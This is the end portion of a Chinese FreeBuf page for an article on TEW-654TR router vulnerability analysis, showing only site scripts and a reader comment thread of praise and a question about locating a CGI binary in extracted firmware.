                                <i class="colour-red">
                                    2                                </i>
                                篇文章</span>
                                            <span>等级：
                                <i class="colour-green">2</i>级
                            </span>
                                        </div>
                                                                                                        </div>
                                <div class="user-center clearfix">
                                                                            <a href="http://www.freebuf.com/author/影武者实验室" data-toggle="tooltip" data-placement="top" title="个人主页" class="home" target="_blank"></a>
                                                                        <a href="http://www.freebuf.com/user/pm?pmaction=newmessage&to=影武者实验室" data-toggle="tooltip" data-placement="top" title="私信" class="letter" target="_blank"></a>
                                </div>
                                <div class="share-ctrl clearfix">
                                                                        <div class="bdsharebuttonbox clearfix bdshare-button-style1-24 columnstatus"
                                         data-bd-bind="1489991449190" data-column="" data-title="TEW-654TR路由器漏洞分析和挖掘" data-name="">
                                        <a href="#" data-toggle="tooltip" data-placement="top" data-cmd="tsina" title="分享到新浪微博" id="tsina"></a>
                                        <a href="#" data-toggle="tooltip" data-placement="top" data-cmd="weixin" title="分享到微信" id="weixin"></a>
                                        <a href="#" data-toggle="tooltip" data-placement="top" data-cmd="qzone" title="分享到QQ空间" id="qzone"></a>
                                       <!-- _shareUrlWeibo = 'http://service.weibo.com/share/share.php?url=http://'+encodeURIComponent(_json[i].url)+'&title='+encodeURIComponent(_json[i].title)+'-FreeBuf涓撴爮路'+_json[i].columnName;
                                        _shareUrlZone = 'http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://'+encodeURIComponent(_json[i].url)+'&title='+_json[i].title+'-FreeBuf涓撴爮路'+_json[i].columnName;
                                        _shareSrc = 'http://s.jiathis.com/qrcode.php?url=http://'+_json[i].url;-->
                                        <span class="share-line">|</span>
                                    </div>
                                </div>
                                <div class="user-ctrl clearfix">
                                                                            <a href="http://www.freebuf.com/oauth" id="collect" data-toggle="tooltip" data-placement="top" title="收藏" ></a>
                                                                        <a href="#respond" data-toggle="tooltip" data-placement="top" title="评论" id="comments"></a>
                                                                        <!--					<a href="#" title="文章纠正">&#xe6e3;</a>-->
                                    <span class="share-line">|</span>
                                    <span class="info-alert"></span>
                                </div>
                            </div>
                            <script>
                                var column = $('.columnstatus').attr('data-column');
                                var text = '';
                                if(column){
                                    var title = $('.columnstatus').attr('data-title');
                                    var name = $('.columnstatus').attr('data-name');
                                    text = title+' - FreeBuf专栏·'+name;
                                }
                                window._bd_share_config={
                                    "common": {
                                        "bdSnsKey": {},
                                        "bdText": text,
                                        "bdMini": "2",
                                        "bdMiniList": ["qzone", "tsina", "weixin"],
                                        "bdPic": "",
                                        "bdStyle": "1",
                                        "bdSize": "24"
                                    },
                                    "share":{},
                                };
                                with(document)0[
                                    (getElementsByTagName('head')[0]||body).
                                    appendChild(createElement('script')).
                                        src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)
                                    ];
                                //控制垂直方向分享模块的定位
                                function shareFixVertical(){
                                    var offsetTop = jQuery(".article-oper").get(0).offsetTop;
                                    var win_h = jQuery(window).height();
                                    var win_w = jQuery(window).width();
                                    var scrollTop = document.body.scrollTop||document.documentElement.scrollTop;
                                    var _height = offsetTop-scrollTop;
                                    var _flag = $('.column-article').attr('data-column');
                                    if(_flag == 1) {
                                        if(_height>=win_h-660&&win_w>975){
                                            var _width = jQuery("#getWidth").innerWidth()-30;
                                            var _left = jQuery("#getWidth").offset().left+15;
                                            jQuery(".share-new").addClass("fixed");
                                            jQuery(".fixed").css({
                                                width:_width,
                                                left:_left
                                            });

                                        }else{
                                            jQuery(".share-new").removeClass("fixed");
                                            jQuery(".share-new").css({
                                                width: "100%"
                                            });
                                        }
                                    }else {
                                        if(_height>=win_h-255&&win_w>975){
                                            var _width = jQuery("#getWidth").innerWidth()-30;
                                            var _left = jQuery("#getWidth").offset().left+15;
                                            jQuery(".share-new").addClass("fixed");
                                            jQuery(".fixed").css({
                                                width:_width,
                                                left:_left
                                            });

                                        }else{
                                            jQuery(".share-new").removeClass("fixed");
                                            jQuery(".share-new").css({
                                                width: "100%"
                                            });
                                        }
                                    }
                                }
                                //控制水平方向分享模块的定位
                                function shareFixHorizontal(){
                                    var _width = jQuery("#getWidth").innerWidth()-30;
                                    var _left = jQuery("#getWidth").get(0).offsetLeft+15;
                                    var win_w = document.documentElement.clientWidth || document.body.clientWidth;
                                    jQuery(".fixed").css({
                                        width:_width,
                                        left:_left
                                    });
                                    if(win_w< 975){
                                        jQuery(".share-new").css({
                                            width: "100%",
                                            left: "0"
                                        });
                                    }else{
                                        var _width = jQuery("#getWidth").innerWidth()-30;
                                        var _left = jQuery("#getWidth").get(0).offsetLeft+15;
                                        jQuery(".fixed").css({
                                            width:_width,
                                            left:_left
                                        });
                                    }
                                }
                                function click(){
                                    var _w = jQuery(window).width();
                                    jQuery(document).click(function(e){
                                        if(jQuery(e.target).attr("id")=="weixin"){
                                            if(_w <= 760) {
                                                jQuery("#bdshare_weixin_qrcode_dialog").hide();
                                                layer.open({
                                                    title: '提示',
                                                    btnAlign: 'c',
                                                    content: '请使用手机浏览器自带的分享功能分享该页面',
                                                    area: '260px'
                                                });
                                            }else {
                                                jQuery("#bdshare_weixin_qrcode_dialog").show();
                                            }
                                        }else {
                                            jQuery("#bdshare_weixin_qrcode_dialog").hide();
                                        }
                                    });
                                }

                                jQuery(window).on("load",function(){
                                    shareFixVertical();
                                    click();
                                });

                                jQuery(window).on("scroll",function(){
                                    //判断滚轮方向
                                    var agent = navigator.userAgent;
                                    if (/.*Firefox.*/.test(agent)) {
                                        document.addEventListener("DOMMouseScroll", function(e) {
                                            e = e || window.event;
                                            var detail = e.detail;
                                            if (detail > 0) {
                                                $(".share-new").removeClass("fixed");
                                                $(".share-new").css({
                                                    width: "100%"
                                                });
                                                $('.main-header .header').removeClass('op1');
                                                $('.main-header .header').addClass('op0');
                                            } else {
                                                shareFixVertical();
                                                $('.main-header .header').removeClass('op0');
                                                $('.main-header .header').addClass('op1');
                                            }
                                        });
                                    } else {
                                        document.onmousewheel = function(e) {
                                            e = e || window.event;
                                            var wheelDelta = e.wheelDelta;
                                            if (wheelDelta > 0) {
                                                shareFixVertical();
                                                $('.main-header .header').removeClass('op0');
                                                $('.main-header .header').addClass('op1');
                                            } else {
                                                $(".share-new").removeClass("fixed");
                                                $(".share-new").css({
                                                    width: "100%"
                                                });
                                                $('.main-header .header').removeClass('op1');
                                                $('.main-header .header').addClass('op0');
                                            }
                                        }
                                    }
                                });


                                jQuery(window).on("resize",function(){
                                    shareFixHorizontal();
                                    click();
                                })

                                //tooltips提示
                                $(function () { $("[data-toggle='tooltip']").tooltip(); });
                            </script>
                        </div>
                                                                                                                            <div class="article-pager ">
                                <ul>
                                    <li class="previous"><span>上一篇：</span><a href="http://www.freebuf.com/articles/terminal/127175.html" rel="prev">加油站也会被黑？来看看这个攻击案例</a>                                    </li>
                                    <li class="next"><span>下一篇：</span>
                                        <a href="http://www.freebuf.com/articles/terminal/127441.html" rel="next">针对Android沙盒的“中间APP攻击”</a>                                    </li>
                                </ul>
                            </div>
                                            </div>
                </div>
                <div class="comment-list">
      <div class="main-tit02">
		<a rel="nofollow" class="btnbtn-default btn-comment" href="#respond">发表评论</a>
        <h3>已有 <span class="color_red">9</span> 条评论
      </div>
      <ul>
         <li class="comment byuser comment-author-softbug even thread-even depth-1" id="li-comment-209263">
    <div id="comment-209263">
        <div class="photo"> <a href="http://www.freebuf.com/author/softbug">
    <img src="http://image.3001.net/2013/10/Vb_logo.jpeg"></a>
     </div>
    <div class="tit"> 
	    <span class="name"> <a href="http://www.freebuf.com/author/softbug" target="_blank">softbug&nbsp;</a>  </span>
        		
		<span class="icon-f"> <a href="http://www.freebuf.com/bufer" target="_blank"><img src="http://image.3001.net/images/index/f1.png" title="认证作者"></a><a href="http://zhuanlan.freebuf.com" target="_blank"><img src="http://image.3001.net/images/index/column-iden.png" title="专栏作者"></a></span>
		<span class="rank">(7级)</span>
				<span class="explain"> 011101000110100001100001011011... </span>
		<span class="time">&nbsp;2017-02-20</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-209263','209263', 'respond','126766' ) " href="?replytocom=209263#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">1楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>好文，已经收藏！ 果然很猥琐 <img src='http://image.3001.net/images/index/smilies/icon_twisted.gif' alt=':twisted:' class='wp-smiley' /> </p>
<div class="comment-tools">
<div class="vote" id="vote-209263"><span id="acv_stat_209263"></span><a class="ilike_icon"  id="vote4-209263" href="javascript:acv_vote(209263,1);">亮了</a>(<span id="cos_support-209263">2</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="209263" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="209263" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="209263" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="209263" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="209263" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment byuser comment-author-n0nbeing odd alt thread-odd thread-alt depth-1" id="li-comment-209270">
    <div id="comment-209270">
        <div class="photo"> <a href="http://www.freebuf.com/author/n0nbeing">
    <img src="http://image.3001.net/2017/02/ffb325fec0486f60721f53219ac015ca.png"></a>
     </div>
    <div class="tit"> 
	    <span class="name"> <a href="http://www.freebuf.com/author/n0nbeing" target="_blank">n0nbeing&nbsp;</a>  </span>
        		
		<span class="icon-f"> </span>
		<span class="rank">(1级)</span>
				<span class="explain"> 关注信息安全行业发展、产品、创业、投融资 </span>
		<span class="time">&nbsp;2017-02-21</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-209270','209270', 'respond','126766' ) " href="?replytocom=209270#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">2楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>非常走心</p>
<div class="comment-tools">
<div class="vote" id="vote-209270"><span id="acv_stat_209270"></span><a class="ilike_icon"  id="vote4-209270" href="javascript:acv_vote(209270,1);">亮了</a>(<span id="cos_support-209270">3</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="209270" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="209270" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="209270" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="209270" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="209270" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment byuser comment-author-murviet even thread-even depth-1" id="li-comment-209271">
    <div id="comment-209271">
        <div class="photo"> <a href="http://www.freebuf.com/author/Murviet">
    <img src="http://image.3001.net/images/20170509/14943139795866.gif!video"></a>
     </div>
    <div class="tit"> 
	    <span class="name"> <a href="http://www.freebuf.com/author/Murviet" target="_blank">Murviet&nbsp;</a>  </span>
        		
		<span class="icon-f"> </span>
		<span class="rank">(2级)</span>
				<span class="explain"> 鸡巴人生，爱情没有，钱也没有 </span>
		<span class="time">&nbsp;2017-02-21</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-209271','209271', 'respond','126766' ) " href="?replytocom=209271#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">3楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>地址是哪的</p>
<div class="comment-tools">
<div class="vote" id="vote-209271"><span id="acv_stat_209271"></span><a class="ilike_icon"  id="vote4-209271" href="javascript:acv_vote(209271,1);">亮了</a>(<span id="cos_support-209271">3</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="209271" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="209271" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="209271" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="209271" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="209271" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment odd alt thread-odd thread-alt depth-1" id="li-comment-209278">
    <div id="comment-209278">
        <div class="photo">     <img src="http://image.3001.net/images/headimg/pic18.png">     </div>
    <div class="tit"> 
	    <span class="name"> GeekPwn<span class="weibo"></span> </span>
        		<span class="explain">  </span>
		<span class="time">&nbsp;2017-02-21</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-209278','209278', 'respond','126766' ) " href="?replytocom=209278#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">4楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>分享</p>
<div class="comment-tools">
<div class="vote" id="vote-209278"><span id="acv_stat_209278"></span><a class="ilike_icon"  id="vote4-209278" href="javascript:acv_vote(209278,1);">亮了</a>(<span id="cos_support-209278">2</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="209278" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="209278" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="209278" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="209278" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="209278" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment byuser comment-author-4746 even thread-even depth-1" id="li-comment-209287">
    <div id="comment-209287">
        <div class="photo"> <a href="http://www.freebuf.com/author/嘎巴嘎巴">
    <img src="http://image.3001.net/images/20170719/15004406871843.gif!video"></a>
     </div>
    <div class="tit"> 
	    <span class="name"> <a href="http://www.freebuf.com/author/嘎巴嘎巴" target="_blank">嘎巴嘎巴&nbsp;</a>  </span>
        		
		<span class="icon-f"> </span>
		<span class="rank">(6级)</span>
				<span class="explain"> 人在做 天在看 </span>
		<span class="time">&nbsp;2017-02-21</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-209287','209287', 'respond','126766' ) " href="?replytocom=209287#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">5楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>NB</p>
<div class="comment-tools">
<div class="vote" id="vote-209287"><span id="acv_stat_209287"></span><a class="ilike_icon"  id="vote4-209287" href="javascript:acv_vote(209287,1);">亮了</a>(<span id="cos_support-209287">3</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="209287" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="209287" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="209287" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="209287" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="209287" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment byuser comment-author-hongxingtest odd alt thread-odd thread-alt depth-1" id="li-comment-209295">
    <div id="comment-209295">
        <div class="photo"> <a href="http://www.freebuf.com/author/hongxingtest">
    <img src="http://www.freebuf.com/buf/plugins/wp-user-avatar/images/wp-user-avatar-96x96.png"></a>
     </div>
    <div class="tit"> 
	    <span class="name"> <a href="http://www.freebuf.com/author/hongxingtest" target="_blank">hongxingtest&nbsp;</a>  </span>
        		
		<span class="icon-f"> </span>
		<span class="rank">(1级)</span>
				<span class="explain">  </span>
		<span class="time">&nbsp;2017-02-21</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-209295','209295', 'respond','126766' ) " href="?replytocom=209295#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">6楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>/usr/bin/my_cgi.cgi 找不到啊</p>
<div class="comment-tools">
<div class="vote" id="vote-209295"><span id="acv_stat_209295"></span><a class="ilike_icon"  id="vote4-209295" href="javascript:acv_vote(209295,1);">亮了</a>(<span id="cos_support-209295">4</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="209295" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="209295" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="209295" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="209295" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="209295" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
<ul class="children">
<li class="comment byuser comment-author-vividz even depth-2" id="li-comment-216153">
    <div id="comment-216153">
        <div class="photo"> <a href="http://www.freebuf.com/author/Vividz">
    <img src="http://www.freebuf.com/buf/plugins/wp-user-avatar/images/wp-user-avatar-96x96.png"></a>
     </div>
    <div class="tit"> 
	    <span class="name"> <a href="http://www.freebuf.com/author/Vividz" target="_blank">Vividz&nbsp;</a>  </span>
        		
		<span class="icon-f"> </span>
		<span class="rank">(1级)</span>
				<span class="explain">  </span>
		<span class="time">&nbsp;2017-04-17</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-216153','216153', 'respond','126766' ) " href="?replytocom=216153#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor"></span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>@ hongxingtest    大佬解决了吗？我也找不到。。。 <img src='http://image.3001.net/images/index/smilies/icon_cry.gif' alt=':cry:' class='wp-smiley' /><br />
root@t-vm:/home/t/Desktop/_TEW-654TR_A1_FW100B19.bin.extracted/squashfs-root# bash run.sh ls<br />
Error while loading /usr/bin/my_cgi.cgi: No such file or directory<br />
难道只能是TEW-654TR_A1_FW110B12.bin才可以吗。。。 <img src='http://image.3001.net/images/index/smilies/icon_confused.gif' alt=':???:' class='wp-smiley' /> </p>
<div class="comment-tools">
<div class="vote" id="vote-216153"><span id="acv_stat_216153"></span><a class="ilike_icon"  id="vote4-216153" href="javascript:acv_vote(216153,1);">亮了</a>(<span id="cos_support-216153">2</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="216153" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="216153" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="216153" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="216153" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="216153" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
<ul class="children">
<li class="comment byuser comment-author-vividz odd alt depth-3" id="li-comment-216379">
    <div id="comment-216379">
        <div class="photo"> <a href="http://www.freebuf.com/author/Vividz">
    <img src="http://www.freebuf.com/buf/plugins/wp-user-avatar/images/wp-user-avatar-96x96.png"></a>
     </div>
    <div class="tit"> 
	    <span class="name"> <a href="http://www.freebuf.com/author/Vividz" target="_blank">Vividz&nbsp;</a>  </span>
        		
		<span class="icon-f"> </span>
		<span class="rank">(1级)</span>
				<span class="explain">  </span>
		<span class="time">&nbsp;2017-04-19</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		           <a onclick="return addComment.moveForm( 'comment-216379','216153', 'respond','126766' )" href="?replytocom=216379#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor"></span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>@ Vividz    搞好了 <img src='http://image.3001.net/images/index/smilies/icon_wink.gif' alt=':wink:' class='wp-smiley' /><br />
root@t-vm:/home/t/Desktop/_TEW-654TR_A1_FW100B19.bin.extracted/squashfs-root# find ./ -name my_cgi*<br />
./usr/bin/my_cgi.cgi</p>
<div class="comment-tools">
<div class="vote" id="vote-216379"><span id="acv_stat_216379"></span><a class="ilike_icon"  id="vote4-216379" href="javascript:acv_vote(216379,1);">亮了</a>(<span id="cos_support-216379">2</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="216379" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="216379" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="216379" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="216379" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="216379" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
<li class="comment even thread-even depth-1" id="li-comment-222589">
    <div id="comment-222589">
        <div class="photo">     <img src="http://image.3001.net/images/headimg/pic10.png">     </div>
    <div class="tit"> 
	    <span class="name"> kkspoof </span>
        		<span class="explain">  </span>
		<span class="time">&nbsp;2017-06-29</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-222589','222589', 'respond','126766' ) " href="?replytocom=222589#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">7楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>你好~请问一下你们最近研究mikrotik相关漏洞了么 就是cia vault7泄露的漏洞</p>
<div class="comment-tools">
<div class="vote" id="vote-222589"><span id="acv_stat_222589"></span><a class="ilike_icon"  id="vote4-222589" href="javascript:acv_vote(222589,1);">亮了</a>(<span id="cos_support-222589">0</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="222589" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="222589" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="222589" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="222589" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="222589" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
      </ul>
      <div class="commentnav page01" style="padding-top:10px; text-align: center;">
               </div>
	  
<script src="http://www.freebuf.com/buf/themes/freebuf/js/ajaxfileupload.js" type="text/javascript"></script>
<div id="respond" class="comment-box">
<input type="file" id="uploadUnit" name="upfile" class="hidden" value="">
    <form action="http://www.freebuf.com/wp-comments-post.php" method="post" id="commentform">
        <div id="comment-author-info">
	    <div class="login-other">
		  <div class="login_button login_icon_sina" title="使用新浪微博登陆" onclick="login_button_click('sina')"></div>
          <div class="login_button login_icon_qq" title="使用腾讯QQ登陆" onclick="login_button_click('qq')"></div></div>
        <div class="login-input">
	    <p><label for="author">昵称</label>
		          <input type="text" name="author" id="author" value="" size="14" tabindex="1" aria-required='true' placeholder = "请输入昵称" required />
        </p><span>必须</span><span>您当前尚未登录。<a  class="simplemodal-login" href="http://www.freebuf.com/oauth" title="登陆">登陆？</a><a  href="https://account.tophant.com/register.html" target="_blank">注册</a></span></div>
		<div class="login-input">
		  <p><label for="email">邮箱</label><input type="text" name="email" id="email" value="" size="25" tabindex="2" aria-required='true' placeholder = "请输入邮箱地址" required /></p>
		<span>必须（保密）</span>
		</div>
    </div>

        <div id="test" class="post-area">
      <div class="holiday"></div>
	    <div class="comment-editor">
			<a id="comment-smiley" href="javascript:;">表情</a><a href="javascript:;" id="imageThumb">插图</a>
	    </div>
        <div id="smileys" >
           <a title="mrgreen" href="javascript:grin(':mrgreen:')"><img src="http://image.3001.net/images/index/smilies/icon_mrgreen.gif" /></a><a title="razz" href="javascript:grin(':razz:')"><img src="http://image.3001.net/images/index/smilies/icon_razz.gif" /></a><a title="sad" href="javascript:grin(':sad:')"><img src="http://image.3001.net/images/index/smilies/icon_sad.gif" /></a><a title="smile" href="javascript:grin(':smile:')"><img src="http://image.3001.net/images/index/smilies/icon_smile.gif" /></a><a title="oops" href="javascript:grin(':oops:')"><img src="http://image.3001.net/images/index/smilies/icon_redface.gif" /></a><a title="grin" href="javascript:grin(':grin:')"><img src="http://image.3001.net/images/index/smilies/icon_biggrin.gif" /></a><a title="eek" href="javascript:grin(':eek:')"><img src="http://image.3001.net/images/index/smilies/icon_surprised.gif" /></a><a title="???" href="javascript:grin(':???:')"><img src="http://image.3001.net/images/index/smilies/icon_confused.gif" /></a><a title="cool" href="javascript:grin(':cool:')"><img src="http://image.3001.net/images/index/smilies/icon_cool.gif" /></a><a title="lol" href="javascript:grin(':lol:')"><img src="http://image.3001.net/images/index/smilies/icon_lol.gif" /></a><a title="mad" href="javascript:grin(':mad:')"><img src="http://image.3001.net/images/index/smilies/icon_mad.gif" /></a><a title="twisted" href="javascript:grin(':twisted:')"><img src="http://image.3001.net/images/index/smilies/icon_twisted.gif" /></a><a title="roll" href="javascript:grin(':roll:')"><img src="http://image.3001.net/images/index/smilies/icon_rolleyes.gif" /></a><a title="wink" href="javascript:grin(':wink:')"><img src="http://image.3001.net/images/index/smilies/icon_wink.gif" /></a><a title="idea" href="javascript:grin(':idea:')"><img src="http://image.3001.net/images/index/smilies/icon_idea.gif" /></a><a title="arrow" href="javascript:grin(':arrow:')"><img src="http://image.3001.net/images/index/smilies/icon_arrow.gif" /></a><a title="neutral" href="javascript:grin(':neutral:')"><img src="http://image.3001.net/images/index/smilies/icon_neutral.gif" /></a><a title="cry" href="javascript:grin(':cry:')"><img src="http://image.3001.net/images/index/smilies/icon_cry.gif" /></a><a title="?" href="javascript:grin(':?:')"><img src="http://image.3001.net/images/index/smilies/icon_question.gif" /></a><a title="evil" href="javascript:grin(':evil:')"><img src="http://image.3001.net/images/index/smilies/icon_evil.gif" /></a><a title="shock" href="javascript:grin(':shock:')"><img src="http://image.3001.net/images/index/smilies/icon_eek.gif" /></a><a title="!" href="javascript:grin(':!:')"><img src="http://image.3001.net/images/index/smilies/icon_exclaim.gif" /></a>        </div>
         <textarea name="comment" id="comment" cols="100%" rows="7" tabindex="4" style="overflow-x:hidden; overflow-y:hidden; border:0; width:100%;" onkeydown="if(event.ctrlKey&amp;&amp;event.keyCode==13){document.getElementById('submit').click();return false};"></textarea>
    </div>
      <div class="subcon but">
      <input class="btn btn-success" type="submit" name="submit" id="submit" tabindex="5" value="提交评论(Ctrl+Enter)" />
      <a rel="nofollow" class="btn btn-default" id="cancel-comment-reply-link" href="javascript:;">取消</a>
      <div class="checkbox"><input type='hidden' name='comment_post_ID' value='126766' id='comment_post_ID' />
<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
<label for="comment_mail_notify" class="comment_mail"><input type="checkbox" name="comment_mail_notify" id="comment_mail_notify" value="comment_mail_notify" checked="checked"/>有人回复时邮件通知我</label></div>
      </div>
    <input name="Token" id="Token" type="hidden" value="47opn5" />
  </form>
  </div>
</div>	  
<div class="commentshow">
<div class="comments-loading">Loading...</div>
</div>
<script language="javascript">
jQuery(document).ready(function($){ //Begin jQuery
    $('.reply').click(function() {
    var atid = '"#' + $(this).parent().attr("id") + '"';
    var atname = $(this).parent().find('span:first').text();
    $("#comment").val("@" + atname + " ").focus();
});
